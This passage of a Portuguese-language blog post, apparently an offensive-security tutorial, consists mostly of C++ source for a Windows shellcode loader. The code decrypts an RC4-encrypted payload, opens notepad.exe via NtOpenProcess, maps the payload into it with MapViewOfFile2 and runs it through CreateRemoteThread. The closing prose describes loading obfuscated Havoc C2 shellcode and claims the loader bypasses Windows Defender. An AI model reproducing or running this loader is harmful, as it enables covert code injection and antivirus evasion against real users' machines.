BOOL InjetarPayload(IN HANDLE handleProcesso, IN PBYTE payload, IN SIZE_T tamanhoPayload, OUT PVOID* enderecoRemoto) {
    BOOL estado = TRUE;
    HANDLE handleMapeamentoArquivo = NULL;
    PVOID enderecoLocal = NULL, enderecoMapeamentoRemoto = NULL;

    handleMapeamentoArquivo = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, (DWORD)tamanhoPayload, NULL);
    if (handleMapeamentoArquivo == NULL) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cerr << "[!] Erro ao criar o mapeamento de arquivo." << std::endl;
        estado = FALSE;
        goto FimDaFuncao;
    }

    enderecoLocal = MapViewOfFile(handleMapeamentoArquivo, FILE_MAP_WRITE, NULL, NULL, tamanhoPayload);
    if (enderecoLocal == NULL) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cerr << "[!] Erro ao mapear a visão do arquivo." << std::endl;
        estado = FALSE;
        goto FimDaFuncao;
    }

    memcpy(enderecoLocal, payload, tamanhoPayload);
    enderecoMapeamentoRemoto = MapViewOfFile2(handleMapeamentoArquivo, handleProcesso, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
    if (enderecoMapeamentoRemoto == NULL) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cerr << "[!] Erro ao mapear a visao do arquivo remoto." << std::endl;
        estado = FALSE;
        goto FimDaFuncao;
    }

FimDaFuncao:
    *enderecoRemoto = enderecoMapeamentoRemoto;
    if (handleMapeamentoArquivo)
        CloseHandle(handleMapeamentoArquivo);
    return estado;
}

BOOL ObterHandleProcesso(IN LPCWSTR nomeProcesso, OUT DWORD* idProcesso, OUT HANDLE* handleProcesso, NtOpenProcess_t NtOpenProcess) {
    HANDLE handleSnapshot = NULL;
    PROCESSENTRY32 entradaProcesso;
    entradaProcesso.dwSize = sizeof(PROCESSENTRY32);

    handleSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (handleSnapshot == INVALID_HANDLE_VALUE) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cerr << "[!] Erro ao criar snapshot do processo." << std::endl;
        goto FimDaFuncao;
    }

    if (!Process32First(handleSnapshot, &entradaProcesso)) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cerr << "[!] Erro ao obter o primeiro processo." << std::endl;
        goto FimDaFuncao;
        return FALSE;
    }

    do {
        WCHAR nomeMinusculo[MAX_PATH * 2];
        DWORD tamanho = lstrlenW(entradaProcesso.szExeFile);
        DWORD i = 0;
        RtlSecureZeroMemory(nomeMinusculo, MAX_PATH * 2);

        if (tamanho < MAX_PATH * 2) {
            for (; i < tamanho; i++)
                nomeMinusculo[i] = (WCHAR)tolower(entradaProcesso.szExeFile[i]);
            nomeMinusculo[i] = '\0';
        }

        if (wcscmp(nomeMinusculo, nomeProcesso) == 0) {
            *idProcesso = entradaProcesso.th32ProcessID;

            OBJECT_ATTRIBUTES objAttr;
            CLIENT_ID clientId;
            InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
            clientId.UniqueProcess = (HANDLE)(*idProcesso);
            clientId.UniqueThread = 0;

            NTSTATUS status = NtOpenProcess(handleProcesso, PROCESS_ALL_ACCESS, &objAttr, &clientId);
            if (status != 0) {
                SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
                std::cerr << "[!] Falha ao abrir o processo." << std::endl;
                break;
            }
        }
    } while (Process32Next(handleSnapshot, &entradaProcesso));

FimDaFuncao:
    if (handleSnapshot != NULL)
        CloseHandle(handleSnapshot);
    if (*idProcesso == NULL || *handleProcesso == NULL)
        return FALSE;
    return TRUE;
}

int main(int argc, wchar_t* argv[]) {
    NtOpenProcess_t NtOpenProcess = GetNtFunction<NtOpenProcess_t>("NtOpenProcess");

    if (!NtOpenProcess) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cerr << "[!] Falha ao resolver uma ou mais funções da API nativa do NT." << std::endl;
        return 1;
    }

    HANDLE processoAlvo = NULL, threadRemota = NULL;
    PVOID enderecoRemoto = NULL;
    DWORD idProcessoAlvo = 0;

	unsigned char payload[] = { 0x00 };

	unsigned char chaveRC4[] = { 0x00 };

	BOOL DECRYPT = RC4DEC(chaveRC4, static_cast<PBYTE>(payload), sizeof(chaveRC4), sizeof(payload));

    if (!DECRYPT) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cerr << "[!] Falha na decriptação do payload." << std::endl;
        return -1;
    }

    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cout << R"(
__________               .__         .____                     .___            
\______   \_____    _____|__| ____   |    |    _________     __| _/___________ 
 |    |  _/\__  \  /  ___/  |/ ___\  |    |   /  _ \__  \   / __ |/ __ \_  __ \
 |    |   \ / __ \_\___ \|  \  \___  |    |__(  <_> ) __ \_/ /_/ \  ___/|  | \/
 |______  /(____  /____  >__|\___  > |_______ \____(____  /\____ |\___  >__|   
        \/      \/     \/        \/          \/         \/      \/    \/       
    )" "\n\n" << std::endl;
    SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);

    std::wcout << L"[+] Pressione Enter para localizar o processo alvo." << std::endl;
    std::cin.get();

    if (!ObterHandleProcesso(L"notepad.exe", &idProcessoAlvo, &processoAlvo, NtOpenProcess)) {
        return -1;
    }

    std::wcout << L"[+] Processo encontrado: PID " << idProcessoAlvo << std::endl;
    std::wcout << L"[+] Endereco do payload: " << static_cast<void*>(payload) << std::endl;
    std::wcout << L"[+] Pressione Enter para injetar o payload." << std::endl;
    std::cin.get();

    if (!InjetarPayload(processoAlvo, payload, sizeof(payload), &enderecoRemoto)) {
        return -1;
    }

    std::wcout << L"[+] Endereco remoto apos injecao: " << enderecoRemoto << std::endl;

    HMODULE moduloKernel = GetModuleHandleA(dllKernel);
    if (moduloKernel == NULL) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cerr << "[!] Erro ao obter o handle para kernel32.dll" << std::endl;
        return -1;
    }

    CriarThreadRemota = (FuncaoThread)GetProcAddress(moduloKernel, nomeFuncaoThread);
    if (CriarThreadRemota == NULL) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cerr << "[!] Erro ao localizar a funcao CreateRemoteThread." << std::endl;
        return -1;
    }

    std::wcout << L"[+] Pressione Enter para criar Thread remota." << std::endl;
	std::cin.get();

    threadRemota = CriarThreadRemota(processoAlvo, NULL, (SIZE_T)0, (LPTHREAD_START_ROUTINE)enderecoRemoto, NULL, 0, NULL);
    if (threadRemota == NULL)
        return 0;

    std::wcout << L"[+] Thread remota criada com sucesso!" << std::endl;

    CloseHandle(threadRemota);
    CloseHandle(processoAlvo);

    return 0;
}
```
## Resaltando pontos importantes

Não estamos evitando a análise estática do código muito bem. Deveríamos melhorar isso, mas acho que vou mostrar como evitar melhor a análise estática do código em outro post focado apenas nesse tópico.
Mesmo assim, esse código, em um contexto de bypass **Windows Defender**, vai funcionar, mas observe que essa técnica não escapará de soluções de defesa mais sofisticadas, como **EDRs** ou alguns **AVs**.
## VirusTotal 

![Resultado](https://i.imgur.com/ExN5zf3.png)

## Testando nosso código<br>
Bom, após gerar a nossa shellcode do `havoc`, vamos ofuscar ela com o nosso código em Python. Depois, basta colocar no nosso código a shellcode ofuscada e a chave RC4 gerada:<br>
<iframe width="760" height="515" src="https://www.youtube.com/embed/lxxMhHpS_As" frameborder="0" allowfullscreen></iframe>

Como podem observar no vídeo, tenho uma exclusão no meu disco local D, mas isso não vai impedir do **Windows Defender** poder detectar nosso "Malware". Notem também que mostro ao longo do vídeo que nossa payload é descriptografada e escrita na memória do processo alvo com sucesso. Também ao longo do vídeo, mostro que, após criar nossa thread remota, a ofuscação de sono começa a fazer efeito, mas mostro que tem sim como detectar a shellcode implantada, aguardando o término do sono e analisando no exato momento em que ele "reinicia" o sono. e obviamente, no final, conseguimos contornar o **Windows Defender** com sucesso.